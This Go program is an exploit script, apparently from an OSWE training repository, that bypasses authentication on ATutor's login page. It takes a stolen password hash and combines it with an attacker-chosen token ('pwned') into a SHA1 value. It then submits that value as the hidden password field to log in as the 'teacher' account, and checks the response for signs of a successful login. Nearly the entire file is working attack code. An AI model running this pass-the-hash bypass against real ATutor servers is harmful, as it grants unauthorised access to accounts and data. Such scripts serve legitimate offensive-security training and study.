package main

import (
	"crypto/sha1"
	"crypto/tls"
	"encoding/hex"
	"flag"
	"fmt"
	"github.com/iPhantasmic/OSWE/scripts/utils"
	"log"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"regexp"
)

// Ex 3.7.1.1 - Authentication Gone Bad

var client *http.Client

const proxyURL = "http://127.0.0.1:8080"

func generateHash(hashedPassword string, token string) string {
	hasher := sha1.New()

	concatenated := hashedPassword + token
	utils.PrintInfo("Intermediate string: " + concatenated)
	hasher.Write([]byte(concatenated))

	finalHash := hex.EncodeToString(hasher.Sum(nil))
	utils.PrintInfo("Final hash: " + finalHash)

	return finalHash
}

func loginWithHash(debug bool, ip string, hash string) bool {
	// do necessary URL manipulation
	requestURL := fmt.Sprintf("http://%s/ATutor/login.php", ip)

	token := "pwned"
	hashed := generateHash(hash, token)

	// prepare POST request body (form)
	data := url.Values{
		"form_password_hidden": {hashed},
		"form_login":           {"teacher"},
		"submit":               {"Login"},
		"token":                {token},
	}

	// send the request
	response := utils.SendPostRequest(client, debug, requestURL, utils.PostRequest{
		ContentType: "form",
		Cookies:     []*http.Cookie{},
		FormData:    data,
		JsonData:    "",
	})

	// regex for evidence of successful login
	match1, _ := regexp.MatchString("Create Course: My Start Page", response.ResponseBody)
	match2, _ := regexp.MatchString("My Courses: My Start Page", response.ResponseBody)
	if match1 || match2 {
		return true
	}

	return false
}

func main() {
	var tr *http.Transport
	useProxy := flag.Bool("proxy", false, "use proxy")
	debug := flag.Bool("debug", false, "debug mode")
	flag.Parse()
	// parse args
	args := os.Args[:]
	log.Println("Args: ", args)

	if len(args) < 3 {
		utils.PrintFailure(fmt.Sprintf("usage: %s [-proxy=<proxyIP>] [-debug=true] <target> <hash>", os.Args[0]))
		utils.PrintFailure(fmt.Sprintf("eg: %s 192.168.121.103", os.Args[0]))
		os.Exit(1)
	}

	ip := flag.Arg(0)
	hash := flag.Arg(1)

	if *useProxy {
		// disable TLS verification and set proxy URL
		proxyUrl, _ := url.Parse(proxyURL)
		tr = &http.Transport{
			TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
			DisableCompression: true, // to ensure that we can obtain Content-Length response header
			Proxy:              http.ProxyURL(proxyUrl),
		}
	} else {
		tr = &http.Transport{
			TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
			DisableCompression: true, // to ensure that we can obtain Content-Length response header
		}
	}

	// cookie jar to help us manage cookies
	jar, err := cookiejar.New(nil)
	if err != nil {
		log.Fatalln("Error while creating cookie jar", err)
	}

	// create our HTTP client using the above transport and cookie jar, then set the global variable
	client = &http.Client{
		Transport: tr,
		Jar:       jar,
	}

	if loginWithHash(*debug, ip, hash) {
		utils.PrintSuccess("Successfully logged in!")
	} else {
		utils.PrintFailure("Failed to login...")
	}
}
